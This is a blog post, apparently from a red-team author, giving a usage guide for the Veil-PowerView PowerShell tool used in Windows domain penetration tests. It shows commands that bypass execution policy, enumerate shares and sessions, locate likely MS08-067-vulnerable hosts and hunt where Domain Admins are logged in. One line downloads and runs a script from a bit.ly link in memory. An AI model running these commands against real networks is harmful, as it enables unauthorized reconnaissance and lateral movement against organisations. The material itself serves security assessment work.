@@ -1,0 +1,56 @@
+<p><strong>[Edit 8/13/15]</strong> – Many of the cmdlets listed here have changed. Check out the <a href="http://www.harmj0y.net/blog/redteaming/powerview-2-0/">PowerView 2.0</a> post to see the new updates.</p>
+<p><strong style="color: #404040;">[Note:</strong><span style="color: #404040;"> this topic was cross-posted on the <a href="https://www.veil-framework.com/veil-powerview-usage-guide/">Veil-Framework site</a>]</span></p>
+<p><a href="https://www.veil-framework.com/veil-powerview/">Veil-PowerView</a> is a project that was originally prompted by a client who locked down their corporate machines by disabling all &#8220;net *&#8221; commands for normal users. While building pure Powershell replacements to easily bypass this protection, I began to explore what else could be done with Powershell from a domain and network situational awareness perspective. Being inspired by my boss <a href="https://twitter.com/davidpmcguire">@davidpmcguire</a>, and drawing on existing work from <a href="https://twitter.com/mubix">@mubix</a>, the offensive Powershell community (<a href="https://twitter.com/obscuresec">@obscuresec</a>, <a href="https://twitter.com/mattifestation">@mattifestation</a>, and <a href="https://github.com/darkoperator">DarkOperator</a>), and the authors of various Metasploit modules like <a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/local_admin_search_enum.rb">local_admin_search_enum</a>, I began to build more interesting functionality to abuse Windows domains. Now that Veil-PowerView has been tested in multiple, diverse environments and has started to mature a bit, I wanted to put together a quick guide on using some of PowerView&#8217;s interesting functionality.</p>
+<p>First, some basic usage: to get the most out of PowerView, you need a current Windows workstation with domain credentials. The credentials don&#8217;t need to be privileged, as many of the API methods abused by the tool only need basic user access. To load up PowerView, first download the raw <a href="https://raw.githubusercontent.com/Veil-Framework/Veil-PowerView/master/powerview.ps1">powerview.ps1 script</a> to a local location, and then launch Powershell:</p>
+<ul>
+<li>C:&gt; powershell.exe -nop -exec bypass</li>
+</ul>
+<p>Then import the PowerView module with the following:</p>
+<ul>
+<li>PS C:\&gt;<strong> Import-Module</strong> [full path to powerview.ps1]</li>
+</ul>
+<p>All of the PowerView cmdlets will now be exposed and tab completable (Invoke-[tab]). To get more information on any command, use get-help [cmdlet], with an optional -full flag to return complete information. I.E. &#8220;<strong>Get-Help Invoke-Netview -full</strong>&#8220;. To get a list of all the available functions, check the <a href="https://raw.githubusercontent.com/Veil-Framework/Veil-PowerView/master/README.md">README.md</a>. Arguments/flags for each cmdles should be tab completable, with something like &#8220;Invoke-Netview -[tab]&#8221;. If you want to output your results to a file, I recommend using the Powershell Out-File cmdlet, I.E. ​&#8221;PS C:\&gt; <strong>Invoke-Netview | Out-File -Encoding ASCII output.txt</strong>&#8221; (the -encoding flag is used since since Powershell defaults to Unicode). If you want detailed output for any of the PowerView commands, just add a &#8220;-Debug&#8221; flag, and if you want status output for any functions that enumerate multiple machines use &#8220;-Verbose&#8221;.</p>
+<p>Now, on to the fun stuff. PowerView provides replaces for almost all Windows net commands, letting you query users, machines, domain controllers, user descriptions, share, sessions, and more. The Get-Net* cmdlets should cover most of your needs. For example, the <strong>Get-NetComputers</strong> cmdlet will let you search for all systems in the domain, and you can provide wildcard searches for the -HostName, -OperatingSystem, and -ServicePack. If you want to use this find all Windows XP boxes on the domain, run:</p>
+<ul>
+<li>PS C:\&gt; <strong>Get-NetComputers -OperatingSystem *xp*</strong></li>
+</ul>
+<p>Since we can search for operating systems and service packs, let&#8217;s take this one step further. How about finding all machines likely vulnerable to MS08-067, ping them and return any hosts that are up? There&#8217;s a function for that:</p>
+<ul>
+<li>PS C:\&gt; <strong>Invoke-FindVulnSystems -Ping</strong></li>
+</ul>
+<p>One of the common things we do on assessments is check for overly permissive file shares that our current user can read. This used to be a pretty manual process, but now we can automate it easily. The following command will query AD for machines using <strong>Get-NetComputers</strong>, ping each machine to ensure it&#8217;s up and responsive, get a list of available shares for each machine using <strong>Get-NetShare</strong>, exclude PRINT$ and IPC$ from the output, and check if the current user has read access:</p>
+<ul>
+<li>PS C:\&gt; <strong>Invoke-ShareFinder -Ping -ExcludePrint -ExcludeIPC -CheckShareAccess </strong></li>
+</ul>
+<p><b>Invoke-Netview</b> is a port of Rob Fullers&#8217;s <a href="http://www.room362.com/blog/2012/10/07/compiling-and-release-of-netview/">netview.exe</a> tool. It uses native Windows API commands to get the sessions, shares, and loggedon users for target machines, often without needing administrative credentials. The following command will query AD for machines using <strong>Get-NetComputers</strong>, ping each machine to ensure it&#8217;s up and responsive, and wait for a delay of 10 seconds between touching each machine:</p>
+<ul>
+<li>PS C:\&gt; <strong>Invoke-Netview -Ping -ExcludeShares -Delay 10</strong></li>
+</ul>
+<p>A really useful thing on an assessment is to know where particular users are logged in. Say you compromise a user that has administrative access to local desktops on a domain. You can <a href="https://www.veil-framework.com/hunting-users-veil-framework/">use functionality in PowerView</a> to find where high value users (default &#8220;Domain Admins&#8221;) are logged in, and can even check if you have local admin on the found machines! The following command will query AD for machines using <strong>Get-NetComputers</strong>, ping each machine to ensure it&#8217;s up and responsive, query AD for members of the &#8220;Domain Admins&#8221; group, and then check if any users currently logged in/have a sessions on a machine match the target user list. Locations where Domain Admins are located are then displayed:</p>
+<ul>
+<li>PS C:\&gt; <strong>Invoke-Userhunter -Ping</strong></li>
+</ul>
+<p>If you want to hunt for a specific user or userlist, or use a pre-populated host list instead of querying AD, there are flags for those actions as well:</p>
+<ul>
+<li>PS C:\&gt; <strong>Invoke-UserHunter -UserName &#8220;jsmith&#8221; -HostList hosts.txt</strong></li>
+</ul>
+<p>An even stealthier way to find where target users are located is to find all the file servers mounted by users from their homeDirectory fields, and run a <strong>Get-NetSessions</strong> command on the found file servers. This will give you a large amount of information on most corporate networks with a minimal amount of traffic! <b>Invoke-StealthUserHunter</b> can automate all of this for you nicely:</p>
+<ul>
+<li>PS C:\&gt; <strong>Invoke-StealthUserhunter -GroupName &#8220;Server Admins&#8221;</strong></li>
+</ul>
+<p>There are plenty of more functions and options in Veil-PowerView than what we covered here: I encourage you to check out <a href="https://github.com/Veil-Framework/Veil-PowerView/blob/master/README.md">PowerView&#8217;s README.md</a> as well as the descriptive comments for each cmdlet <a href="https://github.com/Veil-Framework/Veil-PowerView/blob/master/powerview.ps1">in the source</a> which detail use cases, arguments and outputs for each function.</p>
+<p>If you need to invoke PowerView in a non-interactive context, there are a few additional launching options. If you know the function and arguments you want to run (like <strong>Invoke-Netview</strong>) you can append the function name to the end of the PowerView file and run it with:</p>
+<ul>
+<li>C:\&gt; <strong><span style="color: #000000;">powershell.exe -nop -exec bypass .\powerview.ps1​ &gt; output.txt</span></strong></li>
+</ul>
+<p>You can also run it straight without any script modifications with:</p>
+<ul>
+<li><span style="color: #000000;">C:\&gt; <strong>powershell.exe -exec bypass -Command &#8220;&amp; {Import-Module .\powerview.ps1; Invoke-Netview | Out-File -Encoding ascii output.txt}&#8221;</strong></span></li>
+</ul>
+<p>If you want to invoke everything without touching disk, use something like this:</p>
+<ul>
+<li>C:\&gt; <strong>powershell -nop -exec bypass -c &#8220;IEX (New-Object Net.WebClient).DownloadString(&#8216;http://bit.ly/1mYPUO4&#8217;); Invoke-NetView -Ping | <strong style="color: #000000;">Out-File -Encoding ascii netview.txt</strong>&#8220;</strong></li>
+</ul>
+<p>There&#8217;s also a Metasploit module for running powershell commands through a session, <a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/manage/powershell/exec_powershell.rb"><span class="s1">post/windows/manage/powershell/exec_powershell</span></a>. Before you use this module, first append the desired function and any arguments (i.e. &#8220;Invoke-StealthUserHunter&#8221;) to the end of powerview.ps1 on your attacker machine, and then specify the local path to the script in the module options. Metasploit will upload the script, run it on the target, retrieve the results and save them back to your local machine.</p>
+<p>If you have any questions on PowerView, hit me up at will [at] harmj0y.net, on twitter at @harmj0y, Freednode (harmj0y in #veil or #armitage), submit an issue on the official <a href="https://github.com/veil-framework/Veil-PowerView">Github page</a>, or come check out the Veil-Framework at <a href="https://www.blackhat.com/us-14/arsenal.html#Schroeder">BlackHat Arsenal</a>.</p>
+<p>&nbsp;</p>
